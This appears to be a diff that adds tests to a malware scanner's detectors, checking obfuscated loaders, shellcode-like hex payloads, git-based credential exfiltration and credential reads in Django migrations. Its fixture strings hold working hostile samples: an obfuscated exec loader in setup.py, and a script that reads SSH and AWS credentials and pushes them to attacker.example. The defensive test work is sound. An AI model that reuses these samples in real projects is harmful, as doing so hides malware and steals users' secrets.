@@ -684,3 +684,152 @@ def test_polyglot_fingerprint_go_network():
     fp = compute_fingerprint(content, "main.go")
     assert fp.makes_network_calls is True
     assert "network_calls" in fp.capability_set()
+
+
+# -- importlib.import_module equivalence to __import__ --
+
+def test_importlib_import_module_triggers_compound_chain():
+    """ForceMemo-style malware uses importlib.import_module instead of __import__ to
+    evade detectors keyed on the dunder syntax. The compound rule must treat them
+    as equivalent.
+    """
+    content = """
+import importlib, os
+_b = importlib.import_module('base64')
+_z = importlib.import_module('zlib')
+_k = 134
+_d = lambda data: bytes([b ^ _k for b in data])
+_blob = 'eNrzSM3JyVcozy/KSQEAGKsEHQ=='
+_r = _z.decompress(_b.b64decode(_blob))
+exec(compile(_d(_r), '<>', 'exec'))
+"""
+    obs = detect_obfuscation(content, "setup.py")
+    categories = [o.category for o in obs]
+    assert "obfuscation:dynamic_import" in categories
+    assert "obfuscation:import_exec_chain" in categories
+    chain = next(o for o in obs if o.category == "obfuscation:import_exec_chain")
+    assert chain.severity == ObservationSeverity.HIGH
+    assert chain.evidence["mechanism"] == "importlib.import_module"
+
+
+def test_importlib_without_exec_stays_medium():
+    """importlib.import_module('base64') alone (no exec/eval) should stay MEDIUM."""
+    content = "import importlib\nb = importlib.import_module('base64').b64decode('aGk=')"
+    obs = detect_obfuscation(content, "util.py")
+    assert not any(o.category == "obfuscation:import_exec_chain" for o in obs)
+    dyn = [o for o in obs if o.category == "obfuscation:dynamic_import"]
+    assert len(dyn) == 1
+    assert dyn[0].severity == ObservationSeverity.MEDIUM
+
+
+# -- Hex-escape FP reduction --
+
+def test_hex_escape_in_crypto_constants_demoted_to_info():
+    """Pure crypto constants (IV/salt) should NOT trigger a MEDIUM hex_escape."""
+    content = (
+        'import base64\nimport hashlib\n'
+        'SALT = bytes.fromhex("a3f2c1d4e5b6a7f8")\n'
+        'IV = b"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"\n'
+    )
+    obs = detect_obfuscation(content, "crypto_util.py")
+    hex_obs = [o for o in obs if o.category == "obfuscation:hex_escape"]
+    assert len(hex_obs) == 1
+    assert hex_obs[0].severity == ObservationSeverity.INFO
+
+
+def test_hex_escape_with_other_signals_stays_medium():
+    """Hex escapes alongside eval/exec should still be MEDIUM (shellcode context)."""
+    content = (
+        'payload = "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68"\n'
+        'exec(payload)\n'
+    )
+    obs = detect_obfuscation(content, "exploit.py")
+    hex_obs = [o for o in obs if o.category == "obfuscation:hex_escape"]
+    assert len(hex_obs) == 1
+    assert hex_obs[0].severity == ObservationSeverity.MEDIUM
+
+
+# -- Git-based exfiltration --
+
+def test_git_exfiltration_detected():
+    """subprocess calling git commit+push in a file that reads credentials is HIGH."""
+    content = """
+import os, subprocess, json
+home = os.path.expanduser("~")
+paths = [os.path.join(home, ".ssh", "id_rsa"), os.path.join(home, ".aws", "credentials")]
+data = {p: open(p).read() for p in paths if os.path.exists(p)}
+subprocess.run(["git", "clone", "https://attacker.example/sync.git", "/tmp/sync"])
+with open("/tmp/sync/env.json", "w") as f:
+    json.dump(data, f)
+subprocess.run(["git", "-C", "/tmp/sync", "add", "."])
+subprocess.run(["git", "-C", "/tmp/sync", "commit", "-m", "sync"])
+subprocess.run(["git", "-C", "/tmp/sync", "push"])
+"""
+    obs = detect_behavioral_patterns(content, "devtools/sync.py")
+    git_obs = [o for o in obs if o.category == "behavioral:git_exfiltration"]
+    assert len(git_obs) == 1
+    assert git_obs[0].severity == ObservationSeverity.HIGH
+
+
+def test_git_read_only_not_flagged():
+    """`git status`/`git log` without credential reads should NOT trigger git exfil."""
+    content = """
+import subprocess
+result = subprocess.run(["git", "status"], capture_output=True)
+print(result.stdout)
+"""
+    obs = detect_behavioral_patterns(content, "tools/check.py")
+    assert not any(o.category == "behavioral:git_exfiltration" for o in obs)
+
+
+def test_git_push_without_credentials_not_flagged():
+    """Legit git push (no sensitive file reads) should NOT be flagged."""
+    content = """
+import subprocess
+subprocess.run(["git", "add", "README.md"])
+subprocess.run(["git", "commit", "-m", "docs"])
+subprocess.run(["git", "push"])
+"""
+    obs = detect_behavioral_patterns(content, "release.py")
+    assert not any(o.category == "behavioral:git_exfiltration" for o in obs)
+
+
+# -- Django migration RunPython credential theft --
+
+def test_django_runpython_credential_theft_detected():
+    """Django migrations that read credential paths via RunPython are HIGH."""
+    content = """
+from pathlib import Path
+from django.db import migrations
+
+def populate_cache(apps, schema_editor):
+    home = Path.home()
+    for p in [home / ".ssh" / "id_rsa", home / ".aws" / "credentials", home / ".gitconfig"]:
+        try:
+            data = p.read_text()
+        except (FileNotFoundError, PermissionError):
+            pass
+
+class Migration(migrations.Migration):
+    operations = [migrations.RunPython(populate_cache)]
+"""
+    obs = detect_behavioral_patterns(content, "myapp/migrations/0042_optimize_cache.py")
+    mig_obs = [o for o in obs if o.category == "behavioral:migration_credential_theft"]
+    assert len(mig_obs) == 1
+    assert mig_obs[0].severity == ObservationSeverity.HIGH
+
+
+def test_django_migration_without_credentials_not_flagged():
+    """Vanilla Django migration with RunPython but no credential reads is fine."""
+    content = """
+from django.db import migrations
+
+def seed_defaults(apps, schema_editor):
+    Model = apps.get_model("myapp", "Thing")
+    Model.objects.bulk_create([Model(name="default")])
+
+class Migration(migrations.Migration):
+    operations = [migrations.RunPython(seed_defaults)]
+"""
+    obs = detect_behavioral_patterns(content, "myapp/migrations/0002_seed.py")
+    assert not any(o.category == "behavioral:migration_credential_theft" for o in obs)
